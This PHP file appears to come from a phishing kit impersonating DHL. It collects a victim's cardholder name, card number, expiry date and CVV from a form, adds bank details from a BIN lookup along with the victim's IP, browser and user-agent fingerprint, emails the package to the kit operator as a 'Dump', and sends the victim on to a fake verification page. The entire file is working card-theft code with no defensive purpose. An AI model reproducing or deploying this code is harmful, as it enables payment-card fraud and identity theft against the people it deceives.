<?php

@ini_set('display_errors', 'on');
require 'detect.php';
include "setting.php";
$IP = getenv("REMOTE_ADDR");
$date = date("d M, Y");
$times = date("g:i a");
$code = $_SESSION['ip_countryCode']=clientData('code');
$country = strtolower($code);
if(isset($_POST['cnm'])&&isset($_POST['csc'])){session_start();
$flnm=$_POST['flnm'];
$ccn=str_replace(' ','',$_POST['cnm']);
$cex=$_POST['exp'];
$csc=$_POST['csc'];

$brow = $_SESSION['browser'];
$sys = $_SESSION['os'];
$useragent = $_SERVER['HTTP_USER_AGENT'];
$ecran = $_SESSION['computer'];
$ctp=$_POST['cctype'];
$x2 = $_POST['cnm'];
$bin = $_POST['cnm'] ;
$bin = preg_replace('/\s/', '', $bin);
$bin = substr($bin,0,8);
$url = "https://lookup.binlist.net/".$bin;
$headers = array();
$headers[] = 'Accept-Version: 3';
$ch = curl_init();  
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$resp=curl_exec($ch);
curl_close($ch);
$xBIN = json_decode($resp, true);
$_SESSION['bank_name'] = $xBIN["bank"]["name"];
$_SESSION['bank_scheme'] = strtoupper($xBIN["scheme"]);
$_SESSION['bank_type'] = strtoupper($xBIN["type"]);
$_SESSION['bank_brand'] = strtoupper($xBIN["brand"]);
$bnk = $_SESSION['bank_name'];

//msg for email & telegram "text"
$msg= '
[+]━━━━━【💳 Card INFO 】━━━━[+]
[👤 CardHolder Name]  = '.$flnm.'
[💳 Credit Card Number] = '.$ccn.'
[🔄 Expiry Date ]       = '.$cex.'
[🔑 CVV ]               = '.$csc.'
[+]━━━━━━━━【💳 Bin INFO】━━━━[+]
[🏛 Card Bank]          = '.$_SESSION['bank_name'].' 
[💳 Card type]          = '.$_SESSION['bank_type'].' 
[💳 Card brand]         = '.$_SESSION['bank_brand'].'
[💳 Card ]         = '.$ctp.'
[+]━━━━━━━━【💻 System】━━━━━━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$IP.'
[⏰ TIME/DATE] ='.$times.' / '.$date.'
[🌐 BROWSER] = '.$brow.' and '.$sys.'
[🖖 FINGERPRINT] = '.$useragent.'
[+]━━━━━━━━━【💖DHL💖】━━━━━━━━━━[+]';

$subject  = " Dump / ".$IP." / ".$cnt." CC ";
$headers .= "From: DHL" . "\r\n";
mail($yourmail, $subject, $msg, $headers);
$last = substr($x2,-4);
$_SESSION['ctype']=$ctp;
$_SESSION['flnm']=$flnm;
$_SESSION['last']=$last;
$_SESSION['bnk']=$bnk;
include("api.php");
header('Location: ../verification.php?country.x=Global&tow=ok&flowId=ul&_Email=datax'); 
}


?>